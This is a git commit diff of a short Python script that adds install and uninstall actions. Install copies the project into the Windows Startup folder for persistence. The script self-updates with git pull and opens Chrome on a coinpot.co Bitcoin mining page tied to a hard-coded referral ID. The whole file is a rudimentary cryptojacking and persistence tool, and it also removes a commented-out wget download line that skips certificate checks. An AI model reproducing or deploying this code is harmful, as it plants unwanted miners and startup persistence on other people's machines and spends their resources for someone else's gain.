1ee74c1732d3c9201d0774799ddb64ed89eb6463
Golden0041 <GoldenStriker1101@gmail.com>
2019-06-12 21:18:01 +0400

    add install and uninstall

--- main.py
+++ main.py
@@ -1,33 +1,45 @@
 #!/usr/bin/env python3
+import  sys
 import subprocess
 import os.path
+import shutil
+
+action = sys.argv[1]
+
+kds_path = os.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Startup/kds"
 
 def is_installed():
     # TODO: add checker code
-    return(os.path.exists(os.getenv("APPDATA") + "/Microsoft/Windows/Start Menu/Programs/Startup/kds"))
+    return(os.path.exists(kds_path))
 
 def install():
     # TODO: add install code
     print("Installing...")
+    shutil.copytree(".", kds_path)
+    print("Installation finished.")
 
 def uninstall():
     # TODO: add uninstall code
     print("Uninstalling...")
+    shutil.rmtree(kds_path)
 
 def update():
     # TODO: add update code
+    print("Updating...")
     subprocess.call(["git", "pull"])
 
 def run():
     # TODO: add run code
     subprocess.call(["\Program Files (x86)\Google\Chrome\Application\chrome.exe", "https://coinpot.co/mine/bitcoincore/?ref=9AB12F01235C"])
 
-if is_installed():
-    update()
-    run()
+if action == "--install":
+    if is_installed():
+        update()
+        run()
+    else:
+        install()
+elif (action == "--uninstall") & is_installed():
+    uninstall()
 else:
-    install()
+    run()
 
-
-# subprocess.call(["wget/bin/wget", "--no-check-certificate" "ScriptFile"])
-# %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
